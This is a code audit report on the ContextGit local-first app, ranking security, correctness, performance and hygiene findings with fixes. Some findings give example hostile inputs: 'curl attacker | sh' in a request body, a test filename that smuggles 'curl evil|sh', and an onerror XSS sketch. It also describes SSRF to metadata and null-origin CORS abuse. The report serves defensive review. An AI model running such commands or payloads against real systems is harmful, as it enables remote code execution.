# ContextGit — Full Codebase Audit

**Scope:** `contextgit/**` (Python backend), `desktop/**` (Electron app + bundled VS Code
extension), `app/ components/ lib/` + `next.config.ts` (Next.js landing page), `e2e/ tests/`,
and repo hygiene (`.gitignore`, `package.json`, `pyproject.toml`, CI).
**Method:** static reading across four parallel scans (backend security, backend
architecture/quality, Electron security, performance/hygiene). No code was executed and no
code was changed.
**Revision:** working tree at `main` / commit `b5bfa7f`. Line numbers may drift as code moves.
**Threat model:** ContextGit is local-first. The realistic attacker is (a) any other local
process/user on the machine, or (b) a web page the user opens in their own browser — because
the backend is an unauthenticated HTTP control plane on loopback. Findings are ranked against
that model.

---

## Executive summary

1. **The backend API is an unauthenticated local control plane that can execute shell
   commands.** No auth anywhere (`contextgit/api/app.py`), permissive CORS that trusts any
   `localhost` origin *and* the literal `null` origin, and two `shell=True` sinks fed by
   request bodies: `POST /api/v1/endpoints/serve` (caller `command`) and the team "quality
   gate". Any local process — or a malicious web page / sandboxed iframe — can drive it.
   **(S1–S5)**
2. **The Electron app has a stored XSS in the bundled VS Code extension**: it builds
   `innerHTML` from commit summaries, branch names and server error strings — i.e. from
   agent/model output (`desktop/extensions/contextgraph/src/extension.ts:174-191`). **(S6)**
3. **The SQLite database that stores provider API keys is created with default umask
   permissions** — no `chmod 600` (`contextgit/storage/sqlite.py:64-69`). Keys are redacted at
   the API layer, but a local user can read the file. **(S7)**
4. **`Repo` is a 1,924-line god object** and `api/app.py` (1,634 lines) holds business logic —
   the two biggest maintainability liabilities. Retry loops, the token heuristic and several
   helpers are copy-pasted 3–12×. **(A1–A10)**
5. **Correctness/hang risks:** `council_stream` can hang forever if a member task dies outside
   its `try`; the research pipeline silently returns *empty* artifacts on any error; the
   shared SQLite connection and unlocked repo state are touched from the threadpool without a
   lock. **(A11–A16)**
6. **Performance:** `/api/v1/commits` is O(N²) (double `build_context`); `/api/v1/repo`
   re-serializes every commit message on every mutation; SQLite is **not in WAL**; the desktop
   renderer eagerly imports ~50 modules and polls five endpoints every 4–6 s (each
   `/api/v1/fleet` spawns ~5 `git` processes *per run*). **(P1–P12)**
7. **The Next.js landing config is empty** — a fully static site that could be `output:
   'export'`, ships render-blocking Google Fonts, and pulls an unused `@xyflow/react` dep. **(P1–P3)**
8. **CI runs only `flake8` + `pytest`** and never enforces the `mypy strict` / `ruff` configs
   the project already declares; there is no Python lockfile. **(H1–H3)**

**Do first (P0):** put a per-launch token in front of the API + lock CORS down (kills S2–S5);
escape the extension webview (S6); `chmod 600` the DB (S7); fix the council hang and silent
research failures (A11–A12); enable WAL and fix the O(N²) commits endpoint (P5, P7).

---

## How to read a finding

Each finding has an **ID**, a **severity**, a location (`file:line`), what the code does and
why it is a gap, and a concrete fix. Severities:

| Severity | Meaning |
|---|---|
| **CRITICAL** | Direct, unauthenticated code execution or equivalent on the local machine. |
| **HIGH** | Realistic local privilege/escalation or data-exfiltration path, or an XSS that leads to it. |
| **MEDIUM** | Exploitable with a precondition, or a correctness bug users can hit. |
| **LOW** | Defense-in-depth, hygiene, or hardening. |

---

# Section A — Security

## A.1 Backend API & command execution

### S1 — **CRITICAL** — The API has no authentication at all
**Where:** `contextgit/api/app.py` (whole module).
**Issue:** The only dependency on every route is `repo_dep = Depends(get_repo)`. There is no
`HTTPBearer`, `APIKeyHeader`, auth middleware, or token check — grep for
`Authorization|api_key|HTTPBearer` in `api/` finds only redaction logic. Every route —
including the two RCE paths below, all mutations, and provider-key use — is reachable by
anything that can open a TCP connection to the port.
**Fix:** Generate a random per-launch token in the Electron main process, pass it to the
backend via env, and require it on every route; refuse to start without it. For a
manually-run backend, print the token on startup.

```python
# api/auth.py
import hmac, os
from fastapi import Header, HTTPException

_TOKEN = os.environ.get("CONTEXTGIT_API_TOKEN")

async def require_token(authorization: str | None = Header(None)) -> None:
    if not _TOKEN:
        raise HTTPException(500, "server started without a token")
    if not authorization or not hmac.compare_digest(authorization, f"Bearer {_TOKEN}"):
        raise HTTPException(401, "unauthorized")
```

### S2 — **CRITICAL** — Arbitrary shell command via `POST /api/v1/endpoints/serve`
**Where:** route `contextgit/api/app.py` (`endpoints_serve_start`) → `contextgit/endpoints/serve.py:383-393`.
**Issue:** `EndpointServeRequest.command` is caller-controlled and passed to
`ServerSupervisor.start()`; the sink is `subprocess.Popen(chosen, cwd=run_cwd, shell=True, …)`
where `chosen = command or detected.command`. With S1/S4, a request body like
`{"project_path":"/tmp","command":"curl attacker | sh"}` is executed by `/bin/sh`.
**Fix:** Don't accept a raw command from the wire. Require the value to match a detected gate
command (see `verify/detect.py`) or an explicitly user-approved allow-list stored out-of-band;
and run it as argv, not `shell=True`, whenever possible.

### S3 — **HIGH** — Arbitrary shell command via the team "quality gate"
**Where:** `contextgit/verify/runner.py:35-56` (`subprocess.run(command, shell=True, …)`) fed by
`contextgit/core/repo.py` `run_task_gate()`; command chosen from `task.gate_command →
team.gate_command → detect_gate(...)`.
**Issue:** `gate_command` is free-form and persisted via `POST/PATCH /api/v1/team`
(`set_team_gate`) and `POST/PATCH /api/v1/team/tasks` (`gate_command`). An unauthenticated
caller can set it to anything and then trigger it with `POST /api/v1/team/tasks/{id}/gate`,
`.../complete`, or the MCP `complete_task` tool. Effectively persisted RCE.
**Fix:** Treat the gate command as trusted configuration: only allow values the user set in
the UI, validate against the detected/allow-listed command, and gate the endpoints behind S1.
See `contextgit/verify/detect.py` for the safe hardcoded set to compare against.

### S4 — **HIGH** — Permissive CORS: any localhost origin + literal `null`
**Where:** `contextgit/api/app.py:180-191`; desktop injects `null` at
`desktop/electron/main.ts:72-73`.
**Issue:**
```python
allow_origins=os.getenv("CONTEXTGIT_CORS_ORIGINS", "http://localhost:3000,...").split(","),
allow_origin_regex=r"http://(localhost|127\.0\.0\.1)(:\d+)?",
allow_methods=["*"], allow_headers=["*"],
```
Combined with S1, any local dev server can read/modify the repo, and because `Origin: null` is
what browsers send for sandboxed iframes/opaque origins, **a malicious web page can embed a
sandboxed iframe and read responses** from `http://127.0.0.1:8756`. That exposes the entire
conversation history (`/api/v1/context`), provider records, and the write/RCE routes.
**Fix:** Drop `allow_origin_regex`. Allow only the exact Electron renderer origins and, if the
packaged `file://` origin must be allowed, replace the broad `null` with the token from S1
(same-origin `null` cannot be distinguished, so token-auth is the real control here).

### S5 — **MEDIUM** — Host binding can be overridden to `0.0.0.0`
**Where:** `contextgit/api/server.py:10-14` (`host=os.getenv("CONTEXTGIT_HOST","127.0.0.1")`).
**Issue:** Default is safe and the desktop pins `127.0.0.1`, but an env override exposes the
unauthenticated (S1) RCE API to the LAN.
**Fix:** Refuse to bind non-loopback unless a token is set, or drop the override entirely.

### S6 — **MEDIUM** — Path-influenced document download
**Where:** `contextgit/api/app.py` (`download_document`) → `contextgit/documents/store.py:96-105`.
**Issue:** `document_id` from the URL is concatenated into `documents_dir / f"{document_id}.{ext}"`
without validation. The fixed extension limits the blast radius and Starlette won't match a
raw `/`, but an encoded separator is not stripped — strictly a defense-in-depth gap.
**Fix:** Validate `document_id` against `^[0-9a-f]{12}$` (what `save()` generates) and 404
otherwise. Mirror the safe precedent in `contextgit/apiclient/store.py` (`_NAME` regex).

### S7 — **MEDIUM** — Generated-test filenames interpolated into a shell string
**Where:** `contextgit/endpoints/tests.py:197-201` and `:346-347`
(`f"python -m pytest {relative} -q"`, `" ".join(files)`).
**Issue:** `files` comes from `discover_test_files()` globbing `tests/api/test_*.py` off disk,
unquoted. A file named `test_a;curl evil|sh;.py` placed in the project runs. Requires write
access to the project, hence MEDIUM.
**Fix:** Pass the file list as argv to a `subprocess.run([...])` call without a shell, or
`shlex.quote` each path.

### S8 — **SAFE (noted)** — Git wrapper and SQL are not injectable
`contextgit/gitops/repo.py:30-38` uses list-form `subprocess.run(["git", *args], cwd=…)` (no
shell). `contextgit/storage/sqlite.py` uses `?` placeholders for every value; the only
f-string SQL is table-name interpolation over the internal constants `"providers"` /
`"agent_providers"`. YAML uses `safe_load` only; no `pickle`/`eval`/`exec`. These are correct —
recorded here so no effort is spent re-checking them.

## A.2 Secrets & storage

### S9 — **MEDIUM** — Provider API keys sit in a DB with default permissions
**Where:** `contextgit/storage/sqlite.py:64-69` (`sqlite3.connect(self._db_path, …)`).
**Issue:** No `os.chmod`/`os.open(..., 0o600)` for `.contextgit/contextgit.db`, which stores
`providers.api_key` and `agent_providers.api_key`. On a multi-user machine it is typically
`0644` → any local user can read every LLM key. (Keys *are* correctly redacted at the API
layer — `llm/registry.py` returns `has_key`/`key_hint`; `_redact` scrubs errors — so this is
purely on-disk.)
**Fix:** Create the file `0o600` (and `chmod` on open if it already exists); consider
OS-keychain storage for keys. Also note there is no `close()`/lifespan hook for the connection
(see P — resource hygiene).

### S10 — **LOW** — Harness credentials read from disk/keychain (informational)
`contextgit/limits/cline.py`, `limits/commandcode.py` read other CLIs' stored logins;
`limits/freebuff.py` shells out to `security`/`secret-tool` with fixed argv (safe). Tokens are
only sent to the vendor's own endpoint and never logged. Acceptable — flagged only because the
tool reads third-party credential files.

## A.3 SSRF & outbound requests

### S11 — **MEDIUM** — The HTTP client (API tab) is an unguarded SSRF primitive
**Where:** `contextgit/apiclient/client.py:52-70` (`send_request`, caller-controlled
method/URL, `follow_redirects`).
**Issue:** No host/IP allow-list, so it can reach `http://169.254.169.254/…` (cloud metadata),
router/admin interfaces, etc. Local-first does not make metadata fetch harmless.
**Fix:** At minimum deny link-local/private ranges and loopback-metadata IPs, or make the
"allow internal hosts" an explicit opt-in. If unrestricted access is intended, document it.

### S12 — **MEDIUM** — The research fetcher follows arbitrary URLs
**Where:** `contextgit/research/fetch.py:105-127` (`httpx.AsyncClient(follow_redirects=True)`)
on URLs from search results/model output; the `robots.txt` check is etiquette, not a control.
**Issue:** A malicious search hit or model output steers the backend at internal endpoints.
**Fix:** Same SSRF guard as S11 (block private/link-local after DNS resolution, and re-check on
redirect).

## A.4 Desktop / Electron

### S13 — **HIGH** — Stored XSS in the bundled VS Code extension
**Where:** `desktop/extensions/contextgraph/src/extension.ts:174-183` and `:191`.
**Issue:** The webview (`enableScripts: true`) builds `innerHTML` from `commit.summary`,
`commit.kind`, and branch names — all originating from conversation/commit data, i.e.
**agent/model text** — plus `message.message` (server error strings):
```js
'<span class="msg"><span class="kind">' + (commit.kind || "") + '</span> ' +
  (commit.summary || "(no summary)") + … '.chip">' + n + "</span>"
…
rows.innerHTML = '<p class="error">' + message.message + "</p>";
```
A crafted commit summary/branch name containing `<img onerror=…>` executes in the extension
webview (code-server origin `http://127.0.0.1:<port>`, which S4's regex trusts).
**Fix:** Build rows with `createElement`/`textContent`, or escape every interpolated value.

### S14 — **MEDIUM** — Privileged main window has no navigation/popup guard
**Where:** `desktop/electron/main.ts:144-185`.
**Issue:** The main window carries the full `window.contextgit` preload bridge but registers no
`will-navigate` and no `setWindowOpenHandler`. Any top-level navigation would load a remote
page **with the bridge attached** (→ `ptyStart`, `saveFile`, asset IPC…). Other views are
sandboxed and have no preload, so this window is the one place navigation escalates.
**Fix:** Add `contents.on("will-navigate", e => { if (isExternal) e.preventDefault(); })` and a
`setWindowOpenHandler` that denies/openExternals only for http(s).

### S15 — **MEDIUM** — `shell.openExternal` on arbitrary schemes
**Where:** `desktop/electron/viewmanager.ts:71-75`. The popup handler forwards any non-http(s)
URL (`file:`, custom app schemes) to the OS, while `will-navigate` blocks them. A malicious
page can trigger OS handlers via `window.open(...)`.
**Fix:** Allow-list schemes (e.g. `mailto:`, `tel:`) or remove the `openExternal` fallback.

### S16 — **MEDIUM** — Embedded editor runs `code-server --auth none`
**Where:** `desktop/electron/editor.ts:72-94`.
**Issue:** `--bind-addr 127.0.0.1:<port> --auth none --disable-workspace-trust`. Any local
process/user that finds the port gets a full VS Code session (including an integrated
terminal) in the project; `--disable-workspace-trust` removes the untrusted-repo prompt, so a
hostile repo can auto-run workspace tasks/extensions.
**Fix:** Launch with `--auth password` (or a connection token) generated per launch; re-enable
workspace trust.

### S17 — **MEDIUM** — PTY accepts an arbitrary executable + env from the renderer
**Where:** `desktop/electron/main.ts:587-622` (`ctx:pty-start`); `desktop/electron/pty.ts:49-58`.
**Issue:** `options.command` is passed verbatim to `node-pty` `spawn()` when it isn't a preset
key, and `options.env` is merged over `process.env` unvalidated. `cwd` is correctly
constrained (`resolvePtyCwd`), but a terminal is arbitrary execution by design — the renderer
trust boundary is the *only* control. This is what S13's XSS would convert into process
execution.
**Fix:** Restrict `command` to the preset table (spawn the default shell for unknown values),
and allow-list env keys (`PATH`, `TERM`, …) instead of merging arbitrary pairs.

### S18 — **MEDIUM** — No Content-Security-Policy; inline script + remote fonts
**Where:** `desktop/index.html:7-23` (inline theme bootstrap `<script>`, Google Fonts
`<link>`); no CSP header set anywhere.
**Issue:** With no CSP, any renderer injection can load and run remote script. The inline
script also forces `'unsafe-inline'` when a CSP is later added.
**Fix:** Set a strict CSP; self-host fonts; move the theme bootstrap to an external file or a
nonce.

### S19 — **LOW** — `ctxasset://` registered with `bypassCSP: true`
**Where:** `desktop/electron/main.ts:39-44`. The handler only serves paths from the asset
index (no traversal) and only image/video/doc types, so the immediate risk is low, but it
removes a defense-in-depth control. Consider dropping `bypassCSP`.

### S20 — **LOW** — `ctx:save-file` default path from an unsanitized renderer string
**Where:** `desktop/electron/main.ts:353-368` (`path.join(downloads, options.defaultName)`).
`defaultName` could contain `../`; it only seeds the Save dialog default, so impact is low.
Apply `path.basename()`.

### S21 — **LOW** — No signing/notarization; build-time editor download unverified
**Where:** `desktop/package.json:42-85`; `desktop/scripts/fetch-editor.mjs:30` (curl of a
pinned GitHub release with no checksum). No `electron-updater` exists (good: no update-feed
attack surface), but distributed builds are unsigned and the code-server archive is not
hash-verified.
**Fix:** Add notarization/signing for release; verify the editor archive's hash.

---

# Section B — Architecture & code quality

## B.1 Correctness / hangs / data integrity

### A1 — **HIGH** — `council_stream` can hang forever
**Where:** `contextgit/api/app.py` (`council_stream` → `run_member`).
**Issue:** The consumer loops `while finished < len(tasks)`, counting only `member_done`/`error`
events. `run_member` emits those only inside its inner `try`; the leading
`await queue.put(("member", …))` and the trailing `current.record_usage(...)` are **outside**
it. If either raises (e.g. a SQLite error), the task exits without a terminal event and the SSE
stream blocks forever. The `finally` cancels tasks without awaiting them.
**Fix:** Wrap the whole member body so exactly one terminal event is always emitted
(`try/finally` that puts `error` on unexpected exit), and `await asyncio.gather(*tasks,
return_exceptions=True)` after cancelling.

### A2 — **HIGH** — Research pipeline silently produces empty artifacts
**Where:** `contextgit/research/engine.py:76` (`except Exception: break; return schema()`) and
`:102` (`except Exception: return []`).
**Issue:** Any provider/network/JSON failure yields an empty plan/result and the API streams a
normal `done` event with a blank artifact — the user sees a "successful" empty run and the real
bug (wrong schema, auth failure) is hidden.
**Fix:** Let errors propagate to the stream (the endpoint already emits an `error` event), or
at minimum log and surface a non-empty failure state.

### A3 — **HIGH** — Shared SQLite connection across the threadpool without a lock
**Where:** `contextgit/storage/sqlite.py:64-69`.
**Issue:** One `sqlite3.connect(..., check_same_thread=False)` is used by the sync `def` routes,
which FastAPI runs concurrently in the anyio threadpool (default 40 threads). Transactions are
`with self._conn:` blocks with no mutex; two overlapping blocks share one transaction and one
thread's commit can commit another's partial work. `repo_lock` in `api/app.py` guards only lazy
creation.
**Fix:** Either serialize DB access with a lock (or a connection-per-thread), or make handlers
`async` and funnel DB work through `anyio.to_thread.run_sync` with a lock. Enabling WAL (P5)
also removes reader/writer stalls.

### A4 — **MEDIUM** — Unlocked repo state mutation
**Where:** `contextgit/api/app.py` (`state` dict written by `init_repo`, read/replaced by
`get_repo`) and `contextgit/core/repo.py` `_projects_backfilled` bool mutated in
`_backfill_session_projects()`.
**Issue:** `init_repo` bypasses `repo_lock`, so a concurrent first render can race init/open;
two concurrent `list_sessions()` calls can both run the backfill.
**Fix:** Guard init/open with the same lock; make the backfill idempotent under a lock.

### A5 — **MEDIUM** — `assert` used as control flow in generated-test path
**Where:** `contextgit/endpoints/tests.py` (`_generate` ends with `assert entry is not None`).
**Issue:** `assert` disappears under `python -O`, then a `None` is dereferenced. Replace with an
explicit `if entry is None: raise …`.

### A6 — **LOW** — No shutdown close for the SQLite connection
`SqliteStorage.close()` is only called on init-failure paths; `Repo` has no `close()`. Add a
FastAPI lifespan handler that closes it (and joins/terminates the supervisor's daemon threads).

## B.2 Error handling that hides bugs

### A7 — **MEDIUM** — LLM adapters collapse every failure into a generic `RuntimeError`
**Where:** `contextgit/llm/anthropic.py`, `llm/openai_compatible.py`, `llm/images.py`,
`llm/search.py` (final `except Exception as exc: … raise RuntimeError(f"LLM … failed: {last}")`).
**Issue:** A programming bug inside `_payload`/`_report_usage`/`response.json()` is reported as
"LLM request failed", masking the real cause. Only the retry decision narrows correctly.
**Fix:** Preserve the original exception type/chain for non-retryable errors; reserve the
generic wrap for genuinely provider-side failures.

### A8 — **MEDIUM** — Broad `except Exception: pass` fallbacks with zero logging
**Where:** `merge/semantic.py`, `gitops/status.py:97`, `research/fetch.py:125,146`,
`endpoints/discover.py:114`, `api/app.py:778,850`, `limits/*`. None log.
**Issue:** A provider bug is indistinguishable from "no provider configured"; failures vanish.
**Fix:** Add a module logger and log at `debug`/`warning` in each fallback; keep the fallback
behavior.

### A9 — **LOW** — Unguarded filesystem writes
`contextgit/documents/store.py` `save()` (`write_bytes`/`write_text`) is unguarded; a read-only
repo dir raises a raw `OSError` into the SSE stream. Contrast `gitops/context.py`/`team.py`,
which best-effort guard `OSError`.

## B.3 Concurrency

### A10 — **MEDIUM** — Blocking SQLite/git work on the event loop in streaming endpoints
**Where:** `contextgit/api/app.py` streaming generators call sync `Repo` methods directly
(`current.log/build_context` at request time; `current.record_usage/commit/stage` inside
`events()`). Only provider/network calls are offloaded.
**Issue:** Every DB write blocks the loop for all concurrent chats.
**Fix:** Offload the sync `Repo` calls via `anyio.to_thread.run_sync` (as already done in
`research/engine.py:75,101,118`).

### A11 — **LOW** — Racy supervisor state
`contextgit/endpoints/serve.py`: `_port`/`_healthy` written outside the lock while `status()`
reads them under it; `_note()` writes `_announced_port` from the drain thread; the global
`supervisor()` singleton is created without a lock. Guard these with `_lock`.

## B.4 Structural debt

### A12 — **HIGH (maintainability)** — `Repo` is a 1,924-line god object
**Where:** `contextgit/core/repo.py` (~150 methods: commits, branches, tags, sessions,
worktrees, fleet, claims, team task-graph, gates, verifier runs, merge queue, usage, providers,
HTTP history, porter). Clear seams: usage, team board, merge queue, fleet.
**Fix:** Split into mixins/cooperating services along those seams behind the existing facade.

### A13 — **MEDIUM** — Business logic in the API layer
**Where:** `contextgit/api/app.py` — `_provider_record`, `_record_from_spec`, `_slug`,
`test_provider` orchestration, `snapshot`, `_estimate_text`; plus `"gpt-4o-mini"` default
repeated ~11×.
**Fix:** Move to core/llm modules; introduce one `DEFAULT_CHAT_MODEL` constant.

### A14 — **MEDIUM** — Oversized modules
`core/repo.py` 1,924 · `api/app.py` 1,634 · `storage/sqlite.py` 974 · `endpoints/discover.py`
597 · `core/models.py` 525. Set a soft cap (~500) and split.

### A15 — **LOW** — Circular-import workaround
`contextgit/endpoints/provenance.py:135` imports `discover` inside a function ("avoids a
cycle"). Resolve by moving shared types to a neutral module.

## B.5 Duplication

### A16 — **MEDIUM** — Copy-pasted logic across modules
- **Retry loop ×4:** `llm/anthropic.py`, `llm/openai_compatible.py`, `llm/images.py`,
  `llm/search.py`. Extract one `_request_with_retry`.
- **Token heuristic ×8:** `api/app.py:_estimate_text`, `core/repo.py` (two variants — one uses
  `len//4`, the other `(len+3)//4`: **inconsistent rounding**), `merge/engine.py`,
  `llm/openai_compatible.py`, `llm/anthropic.py`, `llm/fake.py`. Unify.
- **Fence stripping ×3:** `research/engine.py:54`, `merge/semantic.py:61`, `endpoints/tests.py:141`.
- **Provider vs agent-provider endpoints duplicated:** `test_provider` ≈ `test_agent_provider`,
  `fetch_provider_models` ≈ `fetch_agent_provider_models`, `add_provider` ≈ `add_agent_provider`.
- **Managed-block splice ×2:** `gitops/context.py:write_context_block` ≈
  `gitops/team.py:write_team_board`.
- **CLI error boilerplate ×12** in `cli/main.py` (same `except ContextGitError` block). A shared
  decorator removes ~40 lines.
- **`_num()` ×3 / `_get()` ×2** in `limits/*` → `limits/util.py`.
- **Status lists duplicated:** `core/team.py:15 STATUS_ORDER` vs `gitops/team.py _COLUMNS`.

## B.6 Type safety, dead code

### A17 — **LOW** — 18 `# type: ignore`, mostly avoidable
`documents/docx_writer.py` ×12 (add a `Protocol` for the untyped objects, since the module is
already exempted from `disallow_untyped_calls`); `endpoints/discover.py:136,287` (value is
already literal-validated — use a `cast`/narrowing); `documents/pptx_writer.py`,
`documents/styles.py:80`, `storage/sqlite.py:838`.

### A18 — **MEDIUM** — Dead / broken code
- **Broken import:** `contextgit/mcp/server.py:12` `from mcp.server.mcpserver import MCPServer`
  — that module path does not exist in the official `mcp` SDK (`mcp.server.fastmcp.FastMCP` /
  low-level server). `contextgit-mcp` is a declared entry point, so the command is likely
  unimportable. Verify against the pinned `mcp>=2` API.
- **Unused:** `Repo.root_parent()` + `_ROOT_PARENT`, `core/team.py:37 is_ready()`/`:95
  columns()`, `core/hashing.py:49 content_commit_id()`/`:92 id_for_commit()`.
- **Dead `# noqa`** codes that ruff isn't configured to raise (`BLE001`, `PLC0415`, `PLW0603`).
- No `TODO`/`FIXME` markers, no stray `print`/`pdb` in library code — clean in that respect.

### A19 — **LOW** — Maintainability smells
Giant functions (`research/engine.py:run_research` ~160 lines; `core/repo.py:apply_merge`,
`run_merge_queue`, `usage_summary`; `documents/markdown.py:parse_markdown` ~130;
`endpoints/serve.py:start`; `api/app.py:documents_stream`). Magic slices
(`context[-6000:]`, `[:1800]`, `[:160]`, `[:240]`, `[:120]`) and the duplicated
`os.getenv("CONTEXTGIT_REPO") or ".contextgit"` default.

---

# Section C — Performance & resource use

## C.1 Next.js landing page

### P1 — **HIGH** — `next.config.ts` is empty
**Where:** `next.config.ts` (`const nextConfig = {}`). The site is fully static (server
component, no `fetch`).
**Fix:** Add `output: 'export'`, `poweredByHeader: false`, `compiler.removeConsole` in prod,
and an explicit cache-header policy. Static export removes the need for a Node server entirely.

### P2 — **MEDIUM** — Render-blocking Google Fonts
**Where:** `app/layout.tsx:19-31` (two `preconnect`s + a stylesheet for Martian Mono + Schibsted
Grotesk).
**Fix:** Use `next/font/google` — self-hosted, preloaded, no third-party round-trip, no CLS.

### P3 — **MEDIUM** — Unused dependency + eager client components
- `@xyflow/react` is declared in the **root** `package.json` but only imported by
  `desktop/src/shell/git/CommitGraph.tsx` → the root install pulls react-flow + d3 for nothing.
  Remove it from root.
- `app/page.tsx` imports all ten components eagerly; eight are `"use client"` and none are
  `next/dynamic`. Lazy-load the below-the-fold demos (`hero-graph`, `hash-demo`, `merge-dialog`,
  `effects`, `workflow-tabs`).

## C.2 Python backend

### P4 — **HIGH** — `/api/v1/commits` is O(N²)
**Where:** `contextgit/api/app.py:commits()` calls `build_context(commit.id)` **and**
`count_tokens(...)`, and `count_tokens` itself calls `build_context` again
(`core/repo.py:1912`). Each `build_context` re-walks parents via `_walk`, and `_walk` →
`storage.get_commit()` runs 2 queries per node.
**Fix:** Compute context once per commit, single-pass; add a per-request commit/message cache
or a batch "fetch messages for these commit ids" query.

### P5 — **HIGH** — SQLite is not in WAL
**Where:** `contextgit/storage/sqlite.py:64-69` sets only `foreign_keys = ON`.
**Issue:** Default rollback-journal serializes readers against writers on every request.
**Fix:**
```python
self._conn.execute("PRAGMA journal_mode=WAL")
self._conn.execute("PRAGMA synchronous=NORMAL")
self._conn.execute("PRAGMA busy_timeout=5000")
```

### P6 — **HIGH** — `/api/v1/repo` re-serializes every commit message on every mutation
**Where:** `snapshot()` returns `repo.all_commits()` (every commit **with every message body**);
`desktop/src/shell/git/useRepo.ts` refetches after every commit/merge/branch/delete.
**Issue:** JSON grows super-linearly with conversation length and is fully re-sent per action.
**Fix:** Return ids + metadata for the graph; fetch message bodies lazily/paginated.

### P7 — **MEDIUM** — Pervasive N+1 commit reads
`all_commits()` = `get_commit` per id (2 queries each), used by `/api/v1/repo` and
`backfill_usage`; `build_context`/`blame`/`count_tokens`/`branch_metrics` each re-walk and
re-read. Add an LRU commit cache (messages included) or batch-fetch queries.

### P8 — **MEDIUM** — `discover()` re-scans the whole project every call
`contextgit/endpoints/discover.py:project_files()` does `rglob("*")` and `ast.parse`s files up
to 512 KB (up to 4000 files) with no mtime cache. Add an mtime/size-keyed cache.

### P9 — **MEDIUM** — `fleet()` spawns ~5 `git` processes per run, sequentially
`core/repo.py:fleet()` → `workspace_status()` → multiple `subprocess.run` git calls
(`gitops/status.py`). This is the UI's poll endpoint. Cache `workspace_status` for a few
seconds and/or parallelize.

### P10 — **LOW** — `usage_summary` loads the whole table twice
`core/repo.py:usage_summary` (and `backfill_usage`) call `list_usage()` more than once, and the
first call walks every branch fully. Cache per request; add a date index (already indexed on
`created_at`).

## C.3 Electron desktop

### P11 — **HIGH** — Renderer eagerly imports ~50 modules
**Where:** `desktop/src/shell/Shell.tsx` statically imports every tab view (Chat/Code/Assets/
Browser/Editor/Api/Endpoints/Agent/Git/Storage/Team/Usage + dialogs). Only GitView's charts
and the terminal are lazy.
**Fix:** `React.lazy` each `case` in `view()/rail()/dock()` so first paint parses only the
active tab.

### P12 — **HIGH** — Memory: all panes mounted, 10k scrollback, screen reader always on
**Where:** `desktop/src/shell/terminal/PaneCanvas.tsx` renders one live `TerminalPane` per open
run (hidden but alive); `TerminalPane.tsx:175-176` sets `screenReaderMode: true` and
`scrollback: 10000` unconditionally.
**Issue:** N live WebGL xterm instances + N mirrored DOM buffers + N PTYs; `screenReaderMode`
builds a hidden DOM mirror of the entire buffer (real per-pane CPU/RAM). `stageOutput()` also
walks the whole 10k-line buffer per line on output.
**Fix:** Lower scrollback to 1000–2000, make `screenReaderMode` opt-in, and unmount panes not
in the current layout.

### P13 — **MEDIUM** — Always-on polling with git fan-out
**Where:** `useSessions` (4 s), `useFleet` (6 s), `useMergeQueue` (4 s), `useTrash` (4 s),
`useTeam` (4 s) — unconditionally, off-tab.
**Issue:** ~5 HTTP calls every 4–6 s forever; `/api/v1/fleet` alone shells out to git many
times per run (P9).
**Fix:** Gate polling on the active tab and `document.visibilityState`; add server-side caching.

### P14 — **LOW** — Asset library re-parses `assets.json` per byte request
`desktop/electron/library.ts:filePath()` re-reads/re-parses the whole index on every
thumbnail/preview fetch. Cache it in memory (invalidate on write).

### P15 — **LOW** — PyInstaller `--onefile` startup cost
`desktop/scripts/build-backend.sh` builds `--onefile`, which self-extracts to a temp dir on
every launch before importing FastAPI. `--onedir` starts noticeably faster.

## C.4 Disk growth (never reclaimed)

### P16 — **MEDIUM** — No GC / compaction anywhere
- SQLite never `VACUUM`s (no `auto_vacuum`); unreachable commits from deleted branches are
  never GC'd (`all_commits()` includes them).
- Append-only tables with no pruning: `usage_events`, `http_history`, `team_messages`,
  `team_events`.
- `.contextgit/documents/` (one file + JSON sidecar per doc), `research/` run dirs, and the
  asset library (`userData/assets/files`, no dedupe) all accumulate.
- Worktrees under `<project>/.contextgit/worktrees/` are removed only on permanent delete and
  only when clean; trashed runs keep theirs.
**Fix:** Add retention/pruning (age- or count-based) for usage/HTTP/team/doc/research, a
"compact" action (`VACUUM`), and worktree cleanup on trash.

---

# Section D — Repo hygiene & dependencies

### H1 — **GOOD** — `.gitignore` is comprehensive
All build artifacts present on disk (`.next/`, `desktop/dist*`, `.venv/`, `node_modules`,
`*.egg-info`, `tsconfig.tsbuildinfo`, `.coverage`, `.playwright-*`, `.contextgit/`) are matched
and **not tracked**. Only nit: `/node_modules` is root-anchored, so a future nested
`node_modules` wouldn't be caught.

### H2 — **MEDIUM** — CI doesn't enforce the project's own gates
`.github/workflows/python-app.yml` runs only `flake8` + `pytest`. It never runs `mypy`
(`strict = true`) or `ruff`, even though both are configured; it also never builds/tests the
Next.js app or the desktop. Pins Python 3.12 while `requires-python = ">=3.11"`.
**Fix:** Add `ruff check`, `mypy`, `npx tsc --noEmit`, and `cd desktop && npm run build` steps.

### H3 — **MEDIUM** — No Python lockfile; duplicate npm trees
No `uv.lock`/`poetry.lock`; `pyproject.toml` uses floor ranges. Root and `desktop/` have
independent lockfiles and **duplicate React/TypeScript** on disk (no workspace; Vite aliases
React to force one runtime copy).
**Fix:** Adopt a Python lockfile and an npm workspace (or pnpm) to dedupe.

### H4 — **LOW** — Dead weight in the tree
- `landing/` (`index.html`/`script.js`/`styles.css`) — the README calls it an unwired prototype;
  it duplicates the Next.js page.
- `files/chat-research-landscape copy.md` — stray copy.
- 32 design docs in `files/` — which also doubles as the package readme (`pyproject.toml:readme
  = "files/README.md"`). Consider separating docs from the package-readme dir.

---

## Prioritized remediation roadmap

### P0 — do first (security + correctness)
| # | Action | Findings |
|---|---|---|
| 1 | Add a per-launch token to the API; require it on every route. | S1 |
| 2 | Lock CORS to the exact renderer origin; drop `allow_origin_regex` + broad `null`. | S4 |
| 3 | Stop accepting raw shell `command`/`gate_command`; use argv / allow-list. | S2, S3, S7 |
| 4 | Escape the VS Code extension webview output (`textContent`/escape). | S13 |
| 5 | `chmod 600` the SQLite DB holding provider keys. | S9 |
| 6 | Fix the `council_stream` hang; stop silent empty research runs. | A1, A2 |
| 7 | Guard the shared SQLite connection + repo state. | A3, A4 |

### P1 — high value
| # | Action | Findings |
|---|---|---|
| 8 | Enable SQLite WAL + `synchronous=NORMAL` + `busy_timeout`. | P5 |
| 9 | Fix O(N²) `/api/v1/commits`; cache commit messages. | P4, P7 |
| 10 | Main-window navigation guard; restrict `openExternal`; PTY command/env allow-list. | S14, S15, S17 |
| 11 | code-server per-launch auth; re-enable workspace trust. | S16 |
